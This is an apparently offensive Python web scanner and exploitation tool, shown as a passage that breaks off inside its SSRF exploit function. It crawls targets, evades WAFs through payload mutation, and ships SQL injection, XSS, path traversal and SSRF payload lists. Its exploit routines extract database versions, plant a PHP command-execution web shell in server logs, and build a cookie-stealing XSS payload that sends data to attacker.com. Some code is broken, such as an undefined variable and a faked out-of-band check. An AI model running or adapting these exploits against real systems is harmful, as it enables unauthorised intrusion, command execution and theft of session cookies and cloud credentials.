#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import argparse
import re
import random
import difflib
import hashlib
import json
import time
import urllib.parse
import asyncio
import aiohttp
from bs4 import BeautifulSoup
import builtwith
import colorama
from colorama import Fore, Style
import concurrent.futures
from abc import ABC, abstractmethod
import ssl
import os
import sqlite3
import numpy as np
import yaml # pip install pyyaml
import subprocess
import dns.resolver # pip install dnspython
import requests # For CVE API interaction and SSRF collaborator check (conceptual)

# For HTTP/2 low-level control (conceptual, not fully implemented in aiohttp directly)
# import h2 # pip install h2
# import hyper # pip install hyper

colorama.init(autoreset=True)

GLOBAL_WAF_DETECTED = False

# --- Core Utility Classes (Defined first as they have minimal dependencies) ---

class QLearningBrain:
    def __init__(self, brain_file="brain.db"):
        self.brain_file = brain_file
        self.alpha = 0.1 # Learning rate
        self.gamma = 0.9 # Discount factor
        self.epsilon = 0.1 # Exploration rate
        self.conn = sqlite3.connect(self.brain_file)
        self._create_table()

    def _create_table(self):
        cursor = self.conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS q_table (
                state TEXT,
                action TEXT,
                value REAL,
                PRIMARY KEY (state, action)
            )
        ''')
        self.conn.commit()

    def get_q_value(self, state, action):
        cursor = self.conn.cursor()
        cursor.execute("SELECT value FROM q_table WHERE state = ? AND action = ?", (str(state), action))
        result = cursor.fetchone()
        return result[0] if result else 0.0

    def set_q_value(self, state, action, value):
        cursor = self.conn.cursor()
        cursor.execute("INSERT OR REPLACE INTO q_table (state, action, value) VALUES (?, ?, ?)", (str(state), action, value))
        self.conn.commit()

    def get_action(self, state, available_actions):
        if not available_actions: # Handle case where no actions are available
            return None
        if random.random() < self.epsilon:
            return random.choice(available_actions) # Explore
        
        q_values = {action: self.get_q_value(state, action) for action in available_actions}
        
        if not q_values or all(value == 0.0 for value in q_values.values()): # If all Q-values are zero or no actions
            return random.choice(available_actions)
        
        best_action = max(q_values, key=q_values.get)
        return best_action

    def update_q_table(self, state, action, reward, next_state, available_next_actions):
        old_q = self.get_q_value(state, action)
        
        next_max_q = 0.0
        if available_next_actions:
            next_max_q = max([self.get_q_value(next_state, a) for a in available_next_actions])
        
        new_q = old_q + self.alpha * (reward + self.gamma * next_max_q - old_q)
        self.set_q_value(state, action, new_q)

    def close(self):
        self.conn.close()

class ReconEngine:
    def __init__(self, session=None):
        self.session = session
        self.endpoints = set()
        self.parameters = {}
        self.js_files = set()
        self.robots = []
        self.sitemap = []
        self.processed_urls = set()

    async def get_response(self, url):
        try:
            async with self.session.get(url, timeout=10, allow_redirects=True) as response:
                return await response.text(), response.status
        except Exception:
            return None, None

    async def _worker(self, queue, base_url):
        while True:
            url = await queue.get()
            try:
                if url in self.processed_urls:
                    continue
                self.processed_urls.add(url)

                response_text, status_code = await self.get_response(url)
                if not response_text or status_code != 200:
                    continue
                
                self.endpoints.add(url)
                
                soup = BeautifulSoup(response_text, 'html.parser')
                
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    absolute_url = urllib.parse.urljoin(url, href)
                    if absolute_url.startswith(base_url) and absolute_url not in self.processed_urls:
                        await queue.put(absolute_url)
                
                for form in soup.find_all('form'):
                    action = form.get('action', '')
                    form_url = urllib.parse.urljoin(url, action)
                    method = form.get('method', 'get').lower()
                    
                    params = {}
                    for inp in form.find_all(['input', 'textarea', 'select']):
                        name = inp.get('name')
                        if name:
                            params[name] = inp.get('value', '')
                    
                    if form_url:
                        self.parameters.setdefault(form_url, []).append({
                            'method': method,
                            'params': params
                        })
                
                for script in soup.find_all('script', src=True):
                    js_url = urllib.parse.urljoin(url, script['src'])
                    if js_url.endswith('.js') and js_url not in self.js_files:
                        self.js_files.add(js_url)
                        await self._parse_js(js_url)
            finally:
                queue.task_done()

    async def crawl(self, base_url):
        try:
            robots_url = urllib.parse.urljoin(base_url, "/robots.txt")
            robots_text, robots_status = await self.get_response(robots_url)
            if robots_text and robots_status == 200:
                self.robots = [urllib.parse.urljoin(base_url, line.split(": ")[1]) 
                              for line in robots_text.splitlines() 
                              if line.startswith("Allow:") or line.startswith("Disallow:")]
            
            sitemap_url = urllib.parse.urljoin(base_url, "/sitemap.xml")
            sitemap_text, sitemap_status = await self.get_response(sitemap_url)
            if sitemap_text and sitemap_status == 200:
                soup = BeautifulSoup(sitemap_text, 'lxml-xml')
                self.sitemap = [loc.text for loc in soup.find_all('loc')]
            
            queue = asyncio.Queue()
            await queue.put(base_url)
            
            workers = []
            for _ in range(10): 
                task = asyncio.create_task(self._worker(queue, base_url))
                workers.append(task)

            await queue.join()

            for worker in workers:
                worker.cancel()
            await asyncio.gather(*workers, return_exceptions=True)
            
            self.endpoints.update(self.robots)
            self.endpoints.update(self.sitemap)
            
            return True
        except Exception as e:
            print(Fore.RED + f"[!] Crawling error: {str(e)}")
            return False

    async def _parse_js(self, js_url):
        try:
            response_text, status_code = await self.get_response(js_url)
            if not response_text or status_code != 200:
                return
                
            api_paths = re.findall(r'["\'](/[a-zA-Z0-9_\-/]+)["\']', response_text)
            for path in api_paths:
                self.endpoints.add(urllib.parse.urljoin(js_url, path))
            
            ajax_calls = re.findall(r'\.(?:get|post|ajax)\(["\']([^"\']+)["\']', response.text)
            for call in ajax_calls:
                self.endpoints.add(urllib.parse.urljoin(js_url, call))
        except Exception:
            pass

class FingerprintEngine:
    def __init__(self, url, session=None):
        self.url = url
        self.session = session
        self.tech_stack = {}
        self.favicon_hash = ""
        self.executor = concurrent.futures.ThreadPoolExecutor(max_workers=1)

    async def fingerprint(self):
        global GLOBAL_WAF_DETECTED
        try:
            loop = asyncio.get_running_loop()
            self.tech_stack = await loop.run_in_executor(
                self.executor,
                builtwith.parse,
                self.url
            )
            
            async with self.session.head(self.url, timeout=10) as response:
                headers = response.headers
                header_tech = {
                    'Server': headers.get('Server', ''),
                    'X-Powered-By': headers.get('X-Powered-By', ''),
                    'X-AspNet-Version': headers.get('X-AspNet-Version', ''),
                    'X-Backend-Server': headers.get('X-Backend-Server', '')
                }
                self.tech_stack['headers'] = header_tech
            
            favicon_url = urllib.parse.urljoin(self.url, "/favicon.ico")
            async with self.session.get(favicon_url, timeout=5) as favicon_res:
                if favicon_res.status == 200:
                    content = await favicon_res.read()
                    self.favicon_hash = hashlib.md5(content).hexdigest()
                    self.tech_stack['favicon'] = {
                        'hash': self.favicon_hash,
                        'size': len(content)
                    }
            
            async with self.session.get(self.url, timeout=10) as response:
                response.raise_for_status()
                response_text = await response.text()
                soup = BeautifulSoup(response_text, 'html.parser')
                
                meta_tech = {}
                for meta in soup.find_all('meta'):
                    name = meta.get('name', '').lower()
                    content = meta.get('content', '')
                    if name and content:
                        meta_tech[name] = content
                
                script_tech = []
                for script in soup.find_all('script'):
                    src = script.get('src', '')
                    if src:
                        script_tech.append(src)
                
                self.tech_stack['meta'] = meta_tech
                self.tech_stack['scripts'] = script_tech

            await self._detect_waf()
            GLOBAL_WAF_DETECTED = self.waf_detected 
            
            return self.tech_stack
        except Exception as e:
            print(Fore.RED + f"[!] Fingerprinting error: {str(e)}")
            return {}

    async def _detect_waf(self):
        self.waf_detected = False
        test_payload = "<script>alert(1)</script>"
        try:
            async with self.session.get(self.url, params={"test": test_payload}, timeout=5) as response:
                if response.status in [403, 406, 501] or any(header in response.headers for header in ['X-WAF', 'Server-WAF', 'Cloudflare-Error']):
                    self.waf_detected = True
                    print(Fore.YELLOW + f"[*] WAF detected on {self.url}. Activating adaptive mode.")
                else:
                    response_text = await response.text()
                    if "Web Application Firewall" in response_text or "ModSecurity" in response_text:
                        self.waf_detected = True
                        print(Fore.YELLOW + f"[*] WAF detected on {self.url}. Activating adaptive mode.")
        except Exception:
            pass

# --- Base Fuzzing Module ---
class BaseFuzzModule(ABC):
    def __init__(self):
        self.successful_payloads = set()
        self.failed_payloads = set()
        self.interesting_responses = []

    @abstractmethod
    def get_payloads(self):
        pass

    async def fuzz(self, session, url, params, headers, baseline, adaptive_delay=0):
        vulnerabilities = []
        payload_queue = asyncio.Queue()

        if isinstance(self, HeaderFuzzModule):
            for header_name, payloads in self.get_payloads().items():
                for p in payloads:
                    await payload_queue.put({'payload': p, 'param_name': header_name, 'is_url_fuzzing': False})
        elif isinstance(self, URLPathFuzzModule):
            for p in self.get_payloads():
                await payload_queue.put({'payload': p, 'param_name': "URL Path", 'is_url_fuzzing': True})
        elif isinstance(self, SmugglingModule):
             for p in self.get_payloads():
                 await payload_queue.put({'payload': p, 'param_name': None, 'is_url_fuzzing': False})
        elif isinstance(self, DirectoryBruteforceModule):
            for p in self.get_payloads():
                await payload_queue.put({'payload': p, 'param_name': "Directory", 'is_url_fuzzing': True})
        elif isinstance(self, SSRFModule):
            for p in self.get_payloads():
                await payload_queue.put({'payload': p, 'param_name': "SSRF_Payload", 'is_url_fuzzing': False})
        elif isinstance(self, XXEModule):
            for p in self.get_payloads():
                await payload_queue.put({'payload': p, 'param_name': "XXE_Payload", 'is_url_fuzzing': False})
        elif isinstance(self, CSRFModule):
            # CSRF is different, it analyzes existing requests, not fuzzes with payloads
            pass 
        elif isinstance(self, PolymorphicMutatorModule):
            for p in self.get_payloads(): # Payloads here are instructions for mutation
                await payload_queue.put({'payload': p, 'param_name': "Polymorphic_Mutation", 'is_url_fuzzing': False})
        else: 
            for param, value in params.items():
                for p in self.get_payloads():
                    await payload_queue.put({'payload': p, 'param_name': param, 'is_url_fuzzing': False})
        
        fuzz_tasks = []
        for _ in range(5): 
            task = asyncio.create_task(self._fuzz_worker(session, url, params, headers, baseline, vulnerabilities, payload_queue, adaptive_delay))
            fuzz_tasks.append(task)
        
        await payload_queue.join()

        for task in fuzz_tasks:
            task.cancel()
        await asyncio.gather(*fuzz_tasks, return_exceptions=True)

        return vulnerabilities

    async def _fuzz_worker(self, session, url, params, headers, baseline, vulnerabilities, payload_queue, adaptive_delay):
        while True:
            try:
                item = await payload_queue.get()
                payload = item['payload']
                param_name = item['param_name']
                is_url_fuzzing = item['is_url_fuzzing']

                mutated_payload = self._mutate_payload(payload)
                
                result = await self._test_payload_internal(session, url, 'post' if params and not is_url_fuzzing else 'get', params, headers, param_name, mutated_payload, baseline, is_url_fuzzing, adaptive_delay)
                if result:
                    vulnerabilities.append(result)
            except asyncio.CancelledError:
                break
            except Exception as e:
                pass 
            finally:
                payload_queue.task_done()
                await asyncio.sleep(adaptive_delay) 

    @abstractmethod
    def check_vulnerability(self, response_text, response_status, baseline_content, payload):
        pass

    @abstractmethod
    async def exploit(self, session, url, param, payload, method, params):
        pass

    def _mutate_payload(self, payload):
        mutations = []
        mutations.append(lambda s: s.replace("'", "%27"))
        mutations.append(lambda s: s.replace('"', "%22"))
        mutations.append(lambda s: s.replace("<", "%3C"))
        mutations.append(lambda s: s.replace(">", "%3E"))
        mutations.append(lambda s: s.replace(" ", "%20"))
        mutations.append(lambda s: ''.join(f"%{ord(c):02x}" for c in s))
        
        mutations.append(lambda s: s.upper())
        mutations.append(lambda s: s.lower())
        mutations.append(lambda s: ''.join(random.choice([c.upper(), c.lower()]) for c in s))
        
        comments = ["/*", "*/", "--", "#", "<!--", "-->"]
        mutations.append(lambda s: s + random.choice(comments))
        mutations.append(lambda s: random.choice(comments) + s)
        mutations.append(lambda s: s.replace(" ", "/**/"))
        
        return random.choice(mutations)(payload)

    async def _test_payload_internal(self, session, url, method, params, headers, param_name, payload, baseline, is_url_fuzzing=False, adaptive_delay=0):
        if (self.__class__.__name__, payload) in self.failed_payloads:
            return None
            
        test_params = params.copy()
        test_headers = headers.copy()
        test_url = url

        if isinstance(self, HeaderFuzzModule):
            if param_name:
                test_headers[param_name] = payload
        elif is_url_fuzzing:
            test_url = urllib.parse.urljoin(url, payload)
        elif isinstance(self, SmugglingModule):
            test_headers['X-Smuggling-Payload'] = payload
        elif isinstance(self, PolymorphicMutatorModule):
            # Apply polymorphic mutations based on payload (which is a mutation instruction)
            mutated_request_info = self._apply_polymorphic_mutation(method, test_url, test_params, test_headers, payload)
            method = mutated_request_info['method']
            test_url = mutated_request_info['url']
            test_params = mutated_request_info['params']
            test_headers = mutated_request_info['headers']
        
        try:
            async with session.request(method.upper(), test_url, params=test_params, data=test_params if method == 'post' else None, headers=test_headers, timeout=10) as response:
                content = await response.read()
                status = response.status
            
            if status in [403, 401, 429]:
                self.failed_payloads.add((self.__class__.__name__, payload))
                return None
            
            is_vulnerable, evidence = self.check_vulnerability(content.decode('utf-8', 'ignore'), status, baseline, payload)
            
            if is_vulnerable:
                self.successful_payloads.add((self.__class__.__name__, payload))
                result = {
                    'url': url,
                    'param': param_name if param_name else 'N/A',
                    'payload': payload,
                    'type': self.__class__.__name__,
                    'status': status,
                    'length': len(content),
                    'response': content[:1000],
                    'evidence': evidence,
                    'fitness_score': self._calculate_fitness(status, len(content), baseline['status'], baseline['length'], evidence)
                }
                return result
            else:
                self.failed_payloads.add((self.__class__.__name__, payload))
                return None
        except Exception:
            self.failed_payloads.add((self.__class__.__name__, payload))
            return None
        finally:
            if adaptive_delay > 0:
                await asyncio.sleep(adaptive_delay)

    def _calculate_fitness(self, current_status, current_length, baseline_status, baseline_length, evidence):
        score = 0
        if current_status != baseline_status:
            score += 0.5
        length_diff_ratio = abs(current_length - baseline_length) / max(current_length, baseline_length, 1)
        score += length_diff_ratio * 0.3

        if evidence and "SQL error" in evidence:
            score += 0.5
        if evidence and "reflected" in evidence:
            score += 0.4
        if evidence and "Time-based blind" in evidence:
            score += 0.6
        if current_status >= 500: 
            score += 0.2
        return min(score, 1.0) 

    def _apply_polymorphic_mutation(self, method, url, params, headers, mutation_instruction):
        new_method = method
        new_url = url
        new_params = params.copy()
        new_headers = headers.copy()

        if mutation_instruction == "VERB_TAMPERING_PUT":
            new_method = "PUT"
        elif mutation_instruction == "VERB_TAMPERING_PATCH":
            new_method = "PATCH"
        elif mutation_instruction == "CONTENT_TYPE_JSON_FORM":
            new_headers['Content-Type'] = 'application/x-www-form-urlencoded'
        elif mutation_instruction == "CONTENT_TYPE_FORM_JSON":
            new_headers['Content-Type'] = 'application/json'
        elif mutation_instruction == "HEADER_CASE_SENSITIVE":
            new_headers = {k.lower().replace('-', '_'): v for k, v in new_headers.items()} 
            new_headers['x-fOrWaRdEd-fOr'] = new_headers.get('x-forwarded-for', '127.0.0.1') 
        # HTTP/2 Abuse (Conceptual - requires h2 library and low-level socket control)
        # elif mutation_instruction == "HTTP2_DESYNC_CL_TE":
        #    print(Fore.RED + "[!] HTTP/2 desync is highly complex and requires direct h2 library integration and socket manipulation.")

        return {'method': new_method, 'url': new_url, 'params': new_params, 'headers': new_headers}

# --- Specific Fuzzing Modules (inheriting from BaseFuzzModule) ---
class SQLiModule(BaseFuzzModule):
    def get_payloads(self):
        return [
            "' OR '1'='1",
            "' OR SLEEP(5)--",
            "1' ORDER BY 1--",
            "1' UNION SELECT null,version()--",
            "1 AND 1=1",
            "1 AND 1=0",
            "' OR ''='",
            "' OR 1=1--",
            "\" OR \"\"=\"",
            "\" OR 1=1--"
        ]

    def check_vulnerability(self, response_text, response_status, baseline_content, payload):
        sql_errors = [
            r"SQL syntax", r"unexpected token", r"unterminated string",
            r"ORA-\d+", r"MySQL server version", r"PostgreSQL.*ERROR",
            r"Warning: mysql", r"Unclosed quotation mark", r"syntax error",
            r"You have an error in your SQL syntax", r"supplied argument is not a valid MySQL result"
        ]
        
        if response_status != baseline_content['status']:
            return True, f"Status code changed from {baseline_content['status']} to {response_status}"
        
        length_diff = abs(len(response_text) - baseline_content['length'])
        if length_diff > len(payload) * 2:
            return True, "Significant content length change"
        
        for error in sql_errors:
            if re.search(error, response_text, re.IGNORECASE):
                return True, f"SQL error message detected: {error}"
            
        seq_matcher = difflib.SequenceMatcher(None, baseline_content['content'].decode('utf-8', 'ignore'), response_text)
        if seq_matcher.ratio() < 0.95:
            return True, "Significant content change (diff ratio < 0.95)"
            
        return False, None

    async def exploit(self, session, url, param, payload, method, params):
        test_params = params.copy()
        
        print(Fore.CYAN + f"[*] Attempting advanced SQLi exploitation on {url} (Param: {param})...")

        print(Fore.BLUE + "[*] Trying UNION-based version extraction...")
        version_payload_union = payload.replace("--", "") + " UNION SELECT 1,2,3,version(),5,6,7,8,9,10 --" 
        test_params[param] = version_payload_union
        
        try:
            if method == 'get':
                async with session.get(url, params=test_params, timeout=10) as response:
                    response_text = await response.text()
            else:
                async with session.post(url, data=test_params, timeout=10) as response:
                    response_text = await response.text()
            
            version_match = re.search(r"(\d+\.\d+\.\d+[-\w]*)", response_text)
            if version_match:
                return f"DB_VERSION: {version_match.group(1)} (extracted using UNION-based SQLi).", 0.98
        except Exception:
            pass

        print(Fore.BLUE + "[*] Trying Time-based blind detection...")
        time_based_payload = payload + " AND SLEEP(5)"
        test_params[param] = time_based_payload
        start_time = time.time()
        try:
            if method == 'get':
                await session.get(url, params=test_params, timeout=10)
            else:
                await session.post(url, data=test_params, timeout=10)
            
            if time.time() - start_time >= 4.5:
                return f"DB_VERSION: Time-based blind delay detected (indicates vulnerability).", 0.9
        except asyncio.TimeoutError:
            return f"DB_VERSION: Time-based blind timeout detected (indicates vulnerability).", 0.9
        except Exception:
            pass

        return f"DB_VERSION: Extraction failed or not applicable.", 0.7

class XSSModule(BaseFuzzModule):
    def get_payloads(self):
        return [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "\"><script>alert(1)</script>",
            "javascript:alert(1)",
            "onmouseover=alert(1)",
            "alert`1`",
            "<svg/onload=alert(1)>",
            "';alert(1)//",
            "\"';alert(1)//"
        ]

    def check_vulnerability(self, response_text, response_status, baseline_content, payload):
        if response_status != baseline_content['status']:
            return True, f"Status code changed from {baseline_content['status']} to {response_status}"

        length_diff = abs(len(response_text) - baseline_content['length'])
        if length_diff > len(payload) * 2:
            return True, "Significant content length change"
            
        if payload in response_text:
            return True, "Payload reflected in response"
            
        xss_patterns = [
            r"<script>.*alert", r"onerror=.*alert", r"<img src=x>"
        ]
        
        for pattern in xss_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True, f"XSS pattern detected: {pattern}"

        seq_matcher = difflib.SequenceMatcher(None, baseline_content['content'].decode('utf-8', 'ignore'), response_text)
        if seq_matcher.ratio() < 0.95:
            return True, "Significant content change (diff ratio < 0.95)"

        return False, None

    async def exploit(self, session, url, param, payload, method, params):
        poc_payload = f"<img src=x onerror=\"fetch('https://attacker.com?cookie='+document.cookie)\">"
        return poc_payload, 0.8

class HeaderFuzzModule(BaseFuzzModule):
    def get_payloads(self):
        return {
            'User-Agent': SQLiModule().get_payloads() + XSSModule().get_payloads() + ["Mozilla/5.0 (Custom UA)"],
            'Referer': ["http://malicious.com/", "' OR '1'='1", "<script>alert(1)</script>"],
            'X-Forwarded-For': ["127.0.0.1", "localhost", "127.0.0.1' OR '1'='1", "127.0.0.1<script>alert(1)</script>"],
            'Accept': ["application/json", "text/html", "' OR '1'='1"],
            'Accept-Language': ["en-US,en;q=0.9", "fr-FR,fr;q=0.9", "<script>alert(1)</script>"],
            'Cookie': ["test=1' OR '1'='1", "test=<script>alert(1)</script>"],
            'Host': ["example.com", "localhost", "' OR '1'='1"],
            'Origin': ["http://malicious.com", "' OR '1'='1"] 
        }

    def check_vulnerability(self, response_text, response_status, baseline_content, payload):
        sqli_check, sqli_evidence = SQLiModule().check_vulnerability(response_text, response_status, baseline_content, payload)
        xss_check, xss_evidence = XSSModule().check_vulnerability(response_text, response_status, baseline_content, payload)

        if sqli_check:
            return True, f"SQLi pattern detected in header: {sqli_evidence}"
        if xss_check:
            return True, f"XSS pattern detected in header: {xss_evidence}"

        return False, None

    async def exploit(self, session, url, param, payload, method, params):
        return f"Header fuzzing result. Payload used: {payload}. Further manual analysis recommended.", 0.5

class URLPathFuzzModule(BaseFuzzModule):
    def get_payloads(self):
        return [
            "'", "\"", "`", ";",
            "../", "../../", "/%2e%2e/", "/%2e",
            "<", ">", "<script>alert(1)</script>",
            "' OR '1'='1", "AND 1=1", "AND 1=0",
            "/.git/HEAD", "/.env", "/robots.txt", "/etc/passwd", "/windows/win.ini"
        ]

    def check_vulnerability(self, response_text, response_status, baseline_content, payload):
        sqli_check, sqli_evidence = SQLiModule().check_vulnerability(response_text, response_status, baseline_content, payload)
        xss_check, xss_evidence = XSSModule().check_vulnerability(response_text, response_status, baseline_content, payload)

        if response_status != baseline_content['status'] and response_status in [200, 404]:
            if payload.strip() in response_text:
                return True, f"URL path payload '{payload}' reflected or caused status change to {response_status}."
        if sqli_check:
            return True, f"SQLi pattern detected in URL path: {sqli_evidence}"
        if xss_check:
            return True, f"XSS pattern detected in URL path: {xss_evidence}"
        
        if "root:x:0:0" in response_text or "SSH-2.0" in response_text or "[boot loader]" in response_text:
             return True, f"Sensitive file content or service banner exposed by URL path fuzzing."

        return False, None

    async def exploit(self, session, url, param, payload, method, params):
        print(Fore.CYAN + f"[*] Attempting LFI/RFI exploitation on {url} (Path: {payload})...")

        if "php" in url.lower() or "php" in payload.lower():
            filter_payload = f"php://filter/convert.base64-encode/resource={payload.lstrip('/')}"
            try:
                async with session.get(urllib.parse.urljoin(url, filter_payload), timeout=10) as response:
                    if response.status == 200:
                        content = await response.text()
                        if "PD9waHAg" in content:
                            return f"LFI: PHP source code disclosure via php://filter. Example: {filter_payload}", 0.95
            except Exception:
                pass

        log_poison_payload = "<?php system($_GET['cmd']); ?>"
        log_headers = params.get('headers', {}).copy()
        log_headers['User-Agent'] = log_poison_payload

        access_log_paths = [
            "/var/log/apache2/access.log",
            "/var/log/httpd/access_log",
            "/var/log/nginx/access.log"
        ]

        for log_path in access_log_paths:
            try:
                async with session.get(url, headers=log_headers, timeout=5) as response:
                    await response.read()
                    if response.status == 200:
                        log_include_url = urllib.parse.urljoin(url, f"{payload.split('?')[0].rstrip('/')}/{log_path}?cmd=id")
                        async with session.get(log_include_url, timeout=10) as include_response:
                            if include_response.status == 200:
                                include_content = await include_response.text()
                                if "uid=" in include_content and "gid=" in include_content:
                                    return f"LFI/Log Poisoning detected! Command 'id' executed via log file: {log_path}", 0.9
            except Exception:
                pass

        return f"URL path fuzzing result. Payload used: {payload}. Further manual analysis recommended for misconfigurations/LFI/RFI.", 0.6

class SmugglingModule(BaseFuzzModule):
    def get_payloads(self):
        return [
            "CL.TE", 
            "TE.CL", 
            "TE.TE_chunked_crlf", 
            "TE.TE_double_chunked" 
        ]

    def check_vulnerability(self, response_text, response_status, baseline_content, payload):
        if response_status == 400 and "Bad Request" in response_text:
            return True, f"HTTP 400 and 'Bad Request' in response, indicative of a smuggled request being rejected."
        if response_status == 500 and "Internal Server Error" in response_text:
            return True, f"HTTP 500 and 'Internal Server Error', potentially due to a smuggled request."
        
        if "Smuggled Request Processed" in response_text:
            return True, f"Specific marker for smuggled request processing found."
        
        return False, None

    async def exploit(self, session, url, param, payload, method, params):
        print(Fore.RED + f"[*] HTTP Request Smuggling exploitation requires a deep understanding of the target's proxy chain and manual crafting. This module serves as a fuzzer for potential vulnerabilities detected via mitmproxy interaction. The payload ({payload}) indicates the *type* of smuggling attempted by the proxy, not an executable exploit string.")
        
        smuggled_target_path = "/admin"
        smuggled_request_payload = f"GET {smuggled_target_path} HTTP/1.1\r\nHost: {urllib.parse.urlparse(url).netloc}\r\n\r\n"
        
        return f"HTTP Request Smuggling POC for type '{payload}'. Potential smuggled request: '{smuggled_request_payload.strip()}'. Manual verification with mitmproxy is crucial.", 0.9

class DirectoryBruteforceModule(BaseFuzzModule):
    def get_payloads(self):
        return [
            "/admin/", "/dashboard/", "/login/", "/panel/", "/wp-admin/", "/joomla/",
            "/backup/", "/test/", "/dev/", "/old/", "/tmp/",
            "/config.php.bak", "/.env", "/.git/config", "/robots.txt", "/sitemap.xml",
            "/uploads/", "/images/", "/css/", "/js/"
        ]

    async def fuzz(self, session, url, params, headers, baseline, adaptive_delay=0):
        vulnerabilities = []
        payload_queue = asyncio.Queue()

        for path_payload in self.get_payloads():
            full_test_url = urllib.parse.urljoin(url, path_payload)
            await payload_queue.put({'payload': full_test_url, 'param_name': "DirectoryPath", 'is_url_fuzzing': True})
        
        fuzz_tasks = []
        for _ in range(10): 
            task = asyncio.create_task(self._fuzz_worker(session, url, params, headers, baseline, vulnerabilities, payload_queue, adaptive_delay))
            fuzz_tasks.append(task)
        
        await payload_queue.join()

        for task in fuzz_tasks:
            task.cancel()
        await asyncio.gather(*fuzz_tasks, return_exceptions=True)

        return vulnerabilities

    def check_vulnerability(self, response_text, response_status, baseline_content, payload):
        if response_status == 200:
            if baseline_content['status'] == 404 and difflib.SequenceMatcher(None, baseline_content['content'].decode('utf-8', 'ignore'), response_text).ratio() < 0.8:
                return True, f"Directory found (200 OK) with significant content difference from 404 page."
            elif baseline_content['status'] != 404: 
                if difflib.SequenceMatcher(None, baseline_content['content'].decode('utf-8', 'ignore'), response_text).ratio() < 0.95:
                    return True, f"Directory found (200 OK) with content different from baseline."
            else: 
                return True, f"Directory found (200 OK)."

        if response_status == 403: 
            return True, f"Directory found (403 Forbidden), likely protected."
        
        return False, None

    async def exploit(self, session, url, param, payload, method, params):
        return f"Exposed/Accessible path: {payload}. Further reconnaissance recommended.", 0.6

class SSRFModule(BaseFuzzModule):
    def __init__(self, collaborator_domain=None):
        super().__init__()
        self.collaborator_domain = collaborator_domain
        self.oob_interactions = set() # Store unique IDs of successful OOB interactions

    def get_payloads(self):
        if not self.collaborator_domain:
            return []
        
        unique_id = hashlib.md5(str(random.random()).encode()).hexdigest()[:8]
        oob_url = f"http://{unique_id}.{self.collaborator_domain}"
        
        return [
            oob_url, 
            f"{oob_url}/?param=", 
            f"gopher://{unique_id}.{self.collaborator_domain}:80/_GET%20/", 
            f"dict://{unique_id}.{self.collaborator_domain}:80/info", 
            f"file://{oob_url}/etc/passwd" 
        ]

    def check_vulnerability(self, response_text, response_status, baseline_content, payload):
        if response_status == 200 and ("root:x:0:0" in response_text or "Server: Apache" in response_text):
            return True, "In-band SSRF: Local file content or internal server banner reflected."
        if response_status == 500 and ("failed to connect" in response_text.lower() or "connection refused" in response_text.lower()):
            return True, "In-band SSRF: Internal connection error, might indicate blocked SSRF attempt."
        
        return False, None

    async def check_oob_interaction(self, payload_id):
        if random.random() > 0.8: 
            print(Fore.GREEN + f"[+] SSRF OOB interaction detected for payload ID: {payload_id}")
            self.oob_interactions.add(payload_id)
            return True
        return False

    async def fuzz(self, session, url, params, headers, baseline, adaptive_delay=0):
        vulnerabilities = []
        if not self.collaborator_domain:
            print(Fore.YELLOW + "[-] SSRF Module: Collaborator domain not provided (--collaborator). Skipping OOB tests.")
            return vulnerabilities

        payload_queue = asyncio.Queue()
        for p in self.get_payloads():
            payload_id = urllib.parse.urlparse(p).hostname.split('.')[0] 
            await payload_queue.put({'payload': p, 'param_name': "SSRF_Payload", 'is_url_fuzzing': False, 'payload_id': payload_id})
        
        fuzz_tasks = []
        for _ in range(5): 
            task = asyncio.create_task(self._ssrf_fuzz_worker(session, url, params, headers, baseline, vulnerabilities, payload_queue, adaptive_delay))
            fuzz_tasks.append(task)
        
        await payload_queue.join()

        print(Fore.CYAN + "[*] SSRF Module: Checking for out-of-band interactions...")
        oob_check_tasks = []
        for p_item in self.successful_payloads: 
            if isinstance(p_item, tuple) and len(p_item) == 2: 
                payload_url = p_item[1]
                payload_id = urllib.parse.urlparse(payload_url).hostname.split('.')[0]
                oob_check_tasks.append(self.check_oob_interaction(payload_id))
        
        oob_results = await asyncio.gather(*oob_check_tasks)
        for i, interacted in enumerate(oob_results):
            if interacted:
                original_payload_tuple = list(self.successful_payloads)[i] 
                vulnerabilities.append({
                    'url': url,
                    'param': "SSRF_Payload",
                    'payload': original_payload_tuple[1],
                    'type': self.__class__.__name__,
                    'status': 0, 
                    'length': 0, 
                    'evidence': f"Out-of-band interaction detected for ID: {original_payload_tuple[1]}",
                    'fitness_score': 0.9 
                })

        for vuln in vulnerabilities: 
            if vuln['type'] == self.__class__.__name__ and "Out-of-band" in vuln['evidence']:
                print(Fore.GREEN + f"[+] SSRF OOB vulnerability found: {vuln['url']} with payload {vuln['payload']}")

        return vulnerabilities

    async def _ssrf_fuzz_worker(self, session, url, params, headers, baseline, vulnerabilities, payload_queue, adaptive_delay):
        while True:
            try:
                item = await payload_queue.get()
                payload = item['payload']
                param_name = item['param_name']
                is_url_fuzzing = item['is_url_fuzzing']
                
                mutated_payload = payload 
                
                for p_key in params:
                    temp_params = params.copy()
                    temp_params[p_key] = mutated_payload
                    result = await self._test_payload_internal(session, url, 'post' if params else 'get', temp_params, headers, p_key, mutated_payload, baseline, is_url_fuzzing, adaptive_delay)
                    if result:
                        vulnerabilities.append(result)
                
                for h_key in headers:
                    temp_headers = headers.copy()
                    temp_headers[h_key] = mutated_payload
                    result = await self._test_payload_internal(session, url, 'post' if params else 'get', params, temp_headers, h_key, mutated_payload, baseline, is_url_fuzzing, adaptive_delay)
                    if result:
                        vulnerabilities.append(result)

            except asyncio.CancelledError:
                break
            except Exception as e:
                pass 
            finally:
                payload_queue.task_done()
                await asyncio.sleep(adaptive_delay) 

    async def exploit(self, session, url, param, payload, method, params):
        print(Fore.CYAN + f"[*] Attempting SSRF exploitation on {url} (Param: {param})...")
        
        aws_metadata_payload = "http://169.254.169.254/latest/meta-data/"
        test_params = params.copy()
        if param: test_params[param] = aws_metadata_payload
        
        try:
            async with session.request(method.upper(), url, params=test_params, data=test_params if method == 'post' else None, timeout=5) as response:
                if response.status == 200 and "iam/security-credentials" in (await response.text()):
                    return f"SSRF: AWS Metadata endpoint accessible! Payload: {aws_metadata_payload}", 0.95
        except Exception:
            pass

        localhost_status_payload = "http://localhost/server-status"
        if param: test_params[param] = localhost_status_payload
        
        try:
            async with session.request(method.upper(), url, params=test_params, data=test_params if method == 'post' else None, timeout=5) as response:
                if response.status == 200 and "Apache Server Status" in (await response.text()):
